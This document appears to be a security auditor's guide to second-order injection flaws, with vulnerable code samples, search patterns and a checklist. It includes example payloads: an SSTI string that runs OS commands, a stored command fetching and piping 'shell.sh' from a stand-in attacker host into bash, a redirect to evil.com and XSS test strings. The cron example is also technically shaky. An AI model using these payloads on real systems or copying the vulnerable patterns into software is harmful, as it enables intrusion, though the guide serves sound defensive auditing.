# Second-Order Injection — Elite Detection Protocol

> **Context:** The most insidious injection class. Data passes validation at ingestion and is stored cleanly. The detonation occurs when the *same* data is retrieved and reused in a different context — one that lacks fresh sanitization — hours, days, or cron cycles later.

**Tags:** #high #sqli #ssti #command-injection #persistence #second-order
**OWASP:** A03:2021 Injection
**CVSS Base:** 7.5–9.8 (RCE in SSTI/Command paths, Critical in SQLi chains)

---

## The Key Architectural Insight

> First-pass sanitization does NOT implicitly sanitize all future uses of the data.

The auditor must mentally follow data *after* persistence — not just at the input boundary. The question is never "Is this input safe?" but "Is this stored value safe **in every context where it is re-read**?"

---

## Attack Classes with Full Kill Chains

### 1. Second-Order SQL Injection

**Classic scenario — Username as query component:**
```sql
-- Phase 1: Registration (SAFE — parameterized)
INSERT INTO users (username) VALUES (?)  → parameter: "admin'--"

-- Phase 2: Admin action (VULNERABLE — concatenated)
SELECT * FROM audit_log WHERE actor = 'admin'--'
-- Query becomes: SELECT * FROM audit_log WHERE actor = 'admin'
-- The '--' comments out the closing quote → SQL injection succeeds
```

**Non-obvious trigger points** (where second-order SQLi detonates):
- Admin panels displaying user data in dynamically-constructed search queries.
- Report generation systems concatenating stored user attributes into SQL.
- Background jobs processing queued records into downstream queries.
- Email logs, CSV exports using ORM's raw query fallbacks.

**`grep_search`:** Look for flows where a value is retrieved from the DB with safe methods (`findById`, parameterized SELECT) and then inserted into a *new* query via concatenation. The safe read hides an unsafe write downstream.

---

### 2. Second-Order SSTI (Server-Side Template Injection)

**Scenario — Profile bio stored, rendered later:**
```python
# Phase 1: Storage (SAFE — stored as plain text)
user.bio = request.form['bio']  # User submits: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
db.session.commit()

# Phase 2: Admin renders bio in email template (VULNERABLE)
template = jinja2.Template("Hello, {{ user.bio }}!")
rendered = template.render(user=user)  # DETONATION — OS command executed
```

**Second-order SSTI is harder to detect because:**
1. The SSTI payload is never executed at input time (no immediate syntax error).
2. It detonates in a completely different function, file, or service.
3. Scanners that test for SSTI on form submission will miss it.

**`grep_search`:** Look for `render(`, `Template(`, `template.render(` that receive values from **database queries** rather than direct user input. Also: `Jinja2.Environment(`, `env.from_string(`, `pystache.render(db_value`.

**High-risk vectors for second-order SSTI:**
- Admin notification emails using user-provided subjects.
- PDF report generation using stored field values.
- Webhook body templates configured via user input.
- CMS content fields rendered by server-side template engines.

---

### 3. Second-Order Command Injection

**Scenario — Stored system description in a maintenance cronjob:**
```bash
# Cron (nightly): processes descriptions stored in DB
while read desc; do
    echo "Processing: $desc" >> /var/log/maintenance.log  # DETONATION
done < <(mysql -e "SELECT description FROM settings")
```

**User payload stored in DB:** `; curl https://attacker.com/shell.sh | bash`

**`grep_search`:** Shell scripts or cronjob files that read from a database and pipe values into shell interpolation (`$var`, `` `command` ``, `$(command)`). Also: Python `subprocess.call(f"echo {db_value}"`, Node.js `exec(result.name`.

---

### 4. Second-Order XSS (Stored XSS — The Classic)

Most stored XSS is second-order by definition. The nuance worth noting for auditors:

**Non-obvious storage-to-sink paths:**
- User A stores payload in their profile name.
- User B (an Admin) visits the admin panel that renders User A's name via innerHTML without re-encoding.
- **Impact:** Admin XSS, which can be chained to CSRF for full account takeover.

**`grep_search`:** Any location where a value retrieved from DB reaches: `innerHTML`, `document.write(`, `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]` (Angular), `{{{ raw }}}` (Handlebars).

---

### 5. Second-Order Path Traversal / LFI

**Scenario — Stored filename used in file serving:**
```python
# Phase 1: User uploads file, stores filename in DB
filename = secure_filename(request.files['file'].filename)  # Sanitized
db.execute("INSERT INTO uploads (filename) VALUES (?)", filename)

# Phase 2: Admin export job reads ALL filenames and constructs paths
for row in db.execute("SELECT filename FROM uploads"):
    filepath = os.path.join("/exports/", row['filename'])  # NOT re-validated
    shutil.copy(filepath, "/shared/export/")  # Path traversal if '../' survived sanitization
```

**`grep_search`:** File path construction using values from SELECT queries: `os.path.join(base, db_row`, `path.join(dir, result.`, `open(base_path + record.`.

---

### 6. Second-Order Open Redirect

**Scenario — Stored return URL used in redirect:**
```javascript
// Phase 1: OAuth flow stores return_url in DB session
req.session.returnUrl = req.query.return_url; // Could be "https://evil.com"

// Phase 2: After auth, server uses the stored URL
res.redirect(req.session.returnUrl); // VULNERABLE — no validation at redirect time
```

**`grep_search`:** `res.redirect(session.`, `header("Location:", db.get(`, `redirect(stored_url`.

---

## The Auditor's Mental Model for Detection

```
WRITE → [Database / File / Log / Cache / Queue]
                          ↓
READ  → [Admin Panel / Cron / Email / API / Export / Template]
                          ↓
SINK  → [SQL / Shell / Template / DOM / Redirect / FileSystem]
```

**The injection is invisible at the WRITE stage. The auditor must trace it to the SINK stage.**

---

## Strategic Checklist for Auditor
1. [ ] Map all database write operations (INSERT/UPDATE).
2. [ ] For every stored field, trace every READ operation that uses that field.
3. [ ] Verify that each READ-to-SINK path performs its own context-appropriate sanitization.
4. [ ] Pay special attention to admin panels, background jobs, email generation, and export functions.
5. [ ] Test with payloads specific to the downstream context (`{{7*7}}` for SSTI, `'--` for SQLi, `<svg onload=alert(1)>` for XSS).

---

## Chained Exploitation Paths

```
Second-Order SQLi → Admin Query Bypass → All User Data Dump
Second-Order SSTI → Webhook Template → OS Command → RCE
Second-Order XSS → Admin Panel → Admin Cookie Theft → Full Account Takeover
Second-Order Command → Nightly Cron → Persistent Reverse Shell
Second-Order Path Traversal → Export Job → Private Key / Config Files Read
```

---

*Tags: #second-order #sqli #ssti #command-injection #stored-xss #persistence #shiva-vault*
